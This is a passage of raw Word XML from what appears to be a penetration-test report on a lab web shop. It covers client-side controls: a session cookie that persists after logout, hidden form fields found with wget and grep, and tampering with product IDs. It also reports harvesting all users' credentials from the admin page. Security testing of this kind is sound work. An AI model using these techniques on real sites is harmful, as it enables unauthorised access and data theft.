        <w:t>pass</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> information </w:t>
      </w:r>
      <w:r w:rsidR="00D17CE5">
        <w:t>in</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> their URLs and the pages that allow arbitrary input.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AEC55B5" w14:textId="06C91397" w:rsidR="00795208" w:rsidRDefault="00B51A3E" w:rsidP="00795208">
      <w:r>
        <w:t>The user input fields could be vulnerable to cross-site scripting, and t</w:t>
      </w:r>
      <w:r w:rsidR="00795208">
        <w:t xml:space="preserve">he login pages could be vulnerable to </w:t>
      </w:r>
      <w:r w:rsidR="002A1765">
        <w:t>SQL</w:t>
      </w:r>
      <w:r w:rsidR="00795208">
        <w:t xml:space="preserve"> injection, username enumeration, weak pass</w:t>
      </w:r>
      <w:r w:rsidR="002A1765">
        <w:t>words, logic flaws</w:t>
      </w:r>
      <w:r w:rsidR="00D17CE5">
        <w:t>, and brute force attacks</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00795208">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37A0EB61" w14:textId="0F6897CC" w:rsidR="00953372" w:rsidRDefault="00795208" w:rsidP="00795208">
      <w:r>
        <w:t xml:space="preserve">These are </w:t>
      </w:r>
      <w:r w:rsidR="00D17CE5">
        <w:t xml:space="preserve">only </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">some of the vulnerabilities that the application could be vulnerable </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00B51A3E">
        <w:t>to</w:t>
      </w:r>
      <w:r w:rsidR="00D17CE5">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00B51A3E">
        <w:t xml:space="preserve"> and</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00B51A3E">
        <w:t xml:space="preserve"> is not an extensive list.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3372ADEC" w14:textId="77777777" w:rsidR="00953372" w:rsidRDefault="00953372" w:rsidP="00953372">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="16" w:name="_Toc531104334"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Test Client-Side Controls</w:t>
      </w:r>
      <w:bookmarkEnd w:id="16"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F1B9F14" w14:textId="5519466E" w:rsidR="002A1765" w:rsidRDefault="00953372" w:rsidP="002A1765">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="17" w:name="_Toc531104335"/>
      <w:r>
        <w:t>Test Transmission of Data Via the Client</w:t>
      </w:r>
      <w:bookmarkEnd w:id="17"/>
    </w:p>
    <w:p w14:paraId="28A44982" w14:textId="60344E9F" w:rsidR="002A1765" w:rsidRDefault="002A1765" w:rsidP="00953372">
      <w:r>
        <w:t xml:space="preserve">By logging in to the admin page, it is possible </w:t>
      </w:r>
      <w:r w:rsidR="00DF09FC">
        <w:t xml:space="preserve">to gather the username and password of all the users </w:t>
      </w:r>
      <w:r w:rsidR="00823A40">
        <w:t>in the database</w:t>
      </w:r>
      <w:r w:rsidR="00DF09FC">
        <w:t>. From this section, the username and password for</w:t>
      </w:r>
      <w:r w:rsidR="00D17CE5">
        <w:t xml:space="preserve"> the</w:t>
      </w:r>
      <w:r w:rsidR="00DF09FC">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId26" w:history="1">
        <w:r w:rsidR="00DF09FC" w:rsidRPr="00F20528">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Aboruc@gmail.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00D17CE5">
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
        </w:rPr>
        <w:t xml:space="preserve"> account</w:t>
      </w:r>
      <w:r w:rsidR="00DF09FC">
        <w:t xml:space="preserve"> was gathered.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45266DFD" w14:textId="6F116DD4" w:rsidR="00953372" w:rsidRDefault="00953372" w:rsidP="00953372">
      <w:r>
        <w:t xml:space="preserve">From looking at the http headers, it is </w:t>
      </w:r>
      <w:r w:rsidR="00B51A3E">
        <w:t xml:space="preserve">found that every time a user logs in, a </w:t>
      </w:r>
      <w:r>
        <w:t>“secret cookie”</w:t>
      </w:r>
      <w:r w:rsidR="00B51A3E">
        <w:t xml:space="preserve"> is created</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and this cookie is unique </w:t>
      </w:r>
      <w:r w:rsidR="0072376D">
        <w:t>to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> each user. </w:t>
      </w:r>
      <w:r w:rsidR="002A1765">
        <w:t>For example, F</w:t>
      </w:r>
      <w:r w:rsidR="00835BAF">
        <w:t xml:space="preserve">igure </w:t>
      </w:r>
      <w:r w:rsidR="0072376D">
        <w:t>10</w:t>
      </w:r>
      <w:r w:rsidR="00835BAF">
        <w:t xml:space="preserve"> shows the secret cookie for the</w:t>
      </w:r>
      <w:r w:rsidR="002A1765">
        <w:t xml:space="preserve"> hacklab@hacklab.com user, and F</w:t>
      </w:r>
      <w:r w:rsidR="00835BAF">
        <w:t xml:space="preserve">igure </w:t>
      </w:r>
      <w:r w:rsidR="0072376D">
        <w:t>11</w:t>
      </w:r>
      <w:r w:rsidR="00835BAF">
        <w:t xml:space="preserve"> shows the secret cookie for the </w:t>
      </w:r>
      <w:r w:rsidR="00835BAF" w:rsidRPr="00835BAF">
        <w:t>Aboruc@gmail.com</w:t>
      </w:r>
      <w:r w:rsidR="00835BAF">
        <w:t xml:space="preserve"> user.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E565F72" w14:textId="77777777" w:rsidR="00835BAF" w:rsidRDefault="00835BAF" w:rsidP="00835BAF">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="21806B05" wp14:editId="5696653F">
            <wp:extent cx="5943600" cy="1165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65225"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="02987EC5" w14:textId="240F0A7D" w:rsidR="00835BAF" w:rsidRDefault="00835BAF" w:rsidP="00835BAF">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00D61A4D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>10</w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - hacklab secret cookie</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F4403D7" w14:textId="77777777" w:rsidR="00835BAF" w:rsidRDefault="00835BAF" w:rsidP="00835BAF">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="62B71832" wp14:editId="25282F1A">
            <wp:extent cx="5943600" cy="1245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45235"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F541264" w14:textId="3A7FBF98" w:rsidR="00835BAF" w:rsidRDefault="00835BAF" w:rsidP="00835BAF">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00D61A4D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>11</w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Aboruc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> secret cookie</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37527B84" w14:textId="35AD7AEB" w:rsidR="00835BAF" w:rsidRDefault="00835BAF" w:rsidP="00835BAF">
      <w:r>
        <w:t xml:space="preserve">During this test, it was also found that once the user logs out, the secret cookie </w:t>
      </w:r>
      <w:r w:rsidR="0072376D">
        <w:t xml:space="preserve">is not destroyed. The cookie will remain in all subsequent headers until either another user logs in, or the application is closed. </w:t>
      </w:r>
      <w:r w:rsidR="00875A29">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72595416" w14:textId="6217ACB8" w:rsidR="00914B18" w:rsidRDefault="00914B18" w:rsidP="00835BAF">
      <w:r>
        <w:t xml:space="preserve">In order to find out all the </w:t>
      </w:r>
      <w:r w:rsidR="00875A29">
        <w:t>web</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">pages that </w:t>
      </w:r>
      <w:r w:rsidR="00875A29">
        <w:t>contain</w:t>
      </w:r>
      <w:r w:rsidR="009C7155">
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> a hidden field, a bash script was created to run through all the URLs that </w:t>
      </w:r>
      <w:r w:rsidR="009C7155">
        <w:t>were previously found. T</w:t>
      </w:r>
      <w:r w:rsidR="00875A29">
        <w:t xml:space="preserve">he </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="0072376D">
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:t>get</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="0072376D">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0072376D" w:rsidRPr="0072376D">
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="0072376D" w:rsidRPr="0072376D">
        <w:t>Wget</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="0072376D" w:rsidRPr="0072376D">
        <w:t xml:space="preserve"> - GNU Project - Free Software Foundation, 2018)</w:t>
      </w:r>
      <w:r w:rsidR="0072376D">
        <w:t xml:space="preserve"> command</w:t>
      </w:r>
      <w:r w:rsidR="009C7155">
        <w:t xml:space="preserve"> was then used</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0072376D">
        <w:t>on</w:t>
      </w:r>
      <w:r w:rsidR="00875A29">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009C7155">
        <w:t>these URLs, and</w:t>
      </w:r>
      <w:r w:rsidR="0072376D">
        <w:t xml:space="preserve"> with the newly</w:t>
      </w:r>
      <w:r w:rsidR="00875A29">
        <w:t xml:space="preserve"> created</w:t>
      </w:r>
      <w:r w:rsidR="0072376D">
        <w:t xml:space="preserve"> file</w:t>
      </w:r>
      <w:r w:rsidR="00A13870">
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="0072376D">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="009C7155">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidR="0072376D">
        <w:t>G</w:t>
      </w:r>
      <w:r>
        <w:t>rep</w:t>
      </w:r>
      <w:r w:rsidR="0072376D">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0072376D" w:rsidRPr="0072376D">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="0072376D" w:rsidRPr="0072376D">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>grep(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="0072376D" w:rsidRPr="0072376D">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>1) - Linux manual page, 2018)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009C7155">
        <w:t>command was run to look</w:t>
      </w:r>
      <w:r w:rsidR="003562B8">
        <w:t xml:space="preserve"> for the keyword “h</w:t>
      </w:r>
      <w:r>
        <w:t>idden”.</w:t>
      </w:r>
      <w:r w:rsidR="00E248A4">
        <w:t xml:space="preserve"> The full scri</w:t>
      </w:r>
      <w:r w:rsidR="009C7155">
        <w:t>pt can be seen in A</w:t>
      </w:r>
      <w:r w:rsidR="00E248A4">
        <w:t>ppendix E.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00E248A4">
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r w:rsidR="00A13870">
        <w:t>script returned that the following URLs contain the word “hidden”</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67FBC7BA" w14:textId="1EFAFBE9" w:rsidR="00914B18" w:rsidRDefault="00EA689B" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId29" w:history="1">
        <w:r w:rsidR="003025B2" w:rsidRPr="00FC2CB7">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>http://192.168.1.10/alterpassword.php</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="003025B2">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="412A0E9A" w14:textId="25468F7A" w:rsidR="00914B18" w:rsidRDefault="00EA689B" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId30" w:history="1">
        <w:r w:rsidR="003025B2" w:rsidRPr="00FC2CB7">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>http://192.168.1.10/index.php</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="057EF03B" w14:textId="77777777" w:rsidR="00914B18" w:rsidRDefault="00EA689B" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId31" w:history="1">
        <w:r w:rsidR="003025B2" w:rsidRPr="00FC2CB7">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>http://192.168.1.10/insertCustomer.php</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="003025B2">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71D2C971" w14:textId="77777777" w:rsidR="00914B18" w:rsidRDefault="00EA689B" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId32" w:history="1">
        <w:r w:rsidR="003025B2" w:rsidRPr="00FC2CB7">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>http://192.168.1.10/login.php</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="003025B2">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E86F53A" w14:textId="77777777" w:rsidR="00B80364" w:rsidRDefault="00EA689B" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId33" w:history="1">
        <w:r w:rsidR="003025B2" w:rsidRPr="00FC2CB7">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>http://192.168.1.10/logout.php</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="003025B2">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A7A919A" w14:textId="77777777" w:rsidR="00914B18" w:rsidRDefault="00EA689B" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId34" w:history="1">
        <w:r w:rsidR="003025B2" w:rsidRPr="00FC2CB7">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>http://192.168.1.10/products.php</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="003025B2">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B30B17D" w14:textId="77777777" w:rsidR="00914B18" w:rsidRDefault="00EA689B" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId35" w:history="1">
        <w:r w:rsidR="003025B2" w:rsidRPr="00FC2CB7">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>http://192.168.1.10/products.php?command&amp;productid</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0615DB82" w14:textId="4E1F8247" w:rsidR="00914B18" w:rsidRDefault="00EA689B" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId36" w:history="1">
        <w:r w:rsidR="003025B2" w:rsidRPr="00FC2CB7">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>http://192.168.1.10/profile.php</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0F92CE90" w14:textId="77777777" w:rsidR="00914B18" w:rsidRDefault="00EA689B" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId37" w:history="1">
        <w:r w:rsidR="003025B2" w:rsidRPr="00FC2CB7">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>http://192.168.1.10/userValidate.php</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0E0B36F8" w14:textId="77777777" w:rsidR="00914B18" w:rsidRDefault="00914B18" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>http://192.168.1.10/warehouse_1.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F487499" w14:textId="77777777" w:rsidR="00914B18" w:rsidRDefault="00914B18" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>http://192.168.1.10/warehouse_1.php?command&amp;productid</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79AE0DBC" w14:textId="77777777" w:rsidR="00914B18" w:rsidRDefault="00914B18" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>http://192.168.1.10/warehouse_2.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2551E4AD" w14:textId="77777777" w:rsidR="00914B18" w:rsidRDefault="00914B18" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>http://192.168.1.10/warehouse_2.php?command&amp;productid</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51BE9298" w14:textId="77777777" w:rsidR="00914B18" w:rsidRDefault="00914B18" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>http://192.168.1.10/home.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="170AB194" w14:textId="77777777" w:rsidR="00914B18" w:rsidRDefault="00EA689B" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId38" w:history="1">
        <w:r w:rsidR="003025B2" w:rsidRPr="00FC2CB7">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>http://192.168.1.10/session.php</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="336B8676" w14:textId="4965482A" w:rsidR="003562B8" w:rsidRDefault="003025B2" w:rsidP="003025B2">
      <w:r>
        <w:t>After analyzing all the URLs individually, it is found that the</w:t>
      </w:r>
      <w:r w:rsidR="003562B8">
        <w:t xml:space="preserve"> majority use</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> hidden forms for passing </w:t>
      </w:r>
      <w:r w:rsidR="00875A29">
        <w:t xml:space="preserve">details </w:t>
      </w:r>
      <w:r w:rsidR="003562B8">
        <w:t>about</w:t>
      </w:r>
      <w:r w:rsidR="00875A29">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A13870">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidR="00875A29">
        <w:t>products that the site offers</w:t>
      </w:r>
      <w:r w:rsidR="00A13870">
        <w:t xml:space="preserve"> (for example the product ID, the quantity </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00A13870">
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00A13870">
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="507AEB14" w14:textId="3C231693" w:rsidR="003562B8" w:rsidRDefault="003025B2" w:rsidP="003025B2">
      <w:r>
        <w:t>In the /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>alterpassw</w:t>
      </w:r>
      <w:r w:rsidR="009C7155">
        <w:t>ord.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="009C7155">
        <w:t xml:space="preserve"> page the email address</w:t>
      </w:r>
      <w:r w:rsidR="00A13870">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="003562B8">
        <w:t>for the user</w:t>
      </w:r>
      <w:r w:rsidR="00A13870">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009C7155">
        <w:t>whose password is</w:t>
      </w:r>
      <w:r w:rsidR="00697BF7">
        <w:t xml:space="preserve"> being changed</w:t>
      </w:r>
      <w:r w:rsidR="003562B8">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>is contained in a hidden field, whi</w:t>
      </w:r>
      <w:r w:rsidR="003562B8">
        <w:t>ch could potentially be altered.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="104B44DF" w14:textId="001EA9AF" w:rsidR="003025B2" w:rsidRDefault="003562B8" w:rsidP="003025B2">
      <w:r>
        <w:t>I</w:t>
      </w:r>
      <w:r w:rsidR="009C7155">
        <w:t>n the /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="009C7155">
        <w:t>profile.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="009C7155">
        <w:t xml:space="preserve"> page</w:t>
      </w:r>
      <w:r w:rsidR="003025B2">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00B80364">
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidR="003025B2">
        <w:t xml:space="preserve"> username</w:t>
      </w:r>
      <w:r w:rsidR="00B80364">
        <w:t xml:space="preserve"> field</w:t>
      </w:r>
      <w:r w:rsidR="003025B2">
        <w:t xml:space="preserve"> is hidden when updating</w:t>
      </w:r>
      <w:r w:rsidR="00823A40">
        <w:t xml:space="preserve"> the</w:t>
      </w:r>
      <w:r w:rsidR="003025B2">
        <w:t xml:space="preserve"> personal details. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37DC0AC0" w14:textId="7AC67591" w:rsidR="00823A40" w:rsidRDefault="00B80364" w:rsidP="009D5711">
      <w:r>
        <w:t>In the /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>index.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009C7155">
        <w:t>page</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> it is possible to alter the IDs of products when ordering. For example, </w:t>
      </w:r>
      <w:r w:rsidR="009C7155">
        <w:t>the hidden field can be altered</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to change the product id from “1” to “2”. </w:t>
      </w:r>
      <w:r w:rsidR="00823A40">
        <w:t>This is seen in Figure 12.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="696051D0" w14:textId="77777777" w:rsidR="00823A40" w:rsidRDefault="00823A40" w:rsidP="00823A40">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="41F99CEC" wp14:editId="6607121A">
            <wp:extent cx="6751955" cy="3381432"/>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02" t="6838" b="4843"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6769421" cy="3390179"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="087D3903" w14:textId="366CE035" w:rsidR="00823A40" w:rsidRDefault="00823A40" w:rsidP="00823A40">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12</w:t>
      </w:r>
      <w:r w:rsidR="00AE0968">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
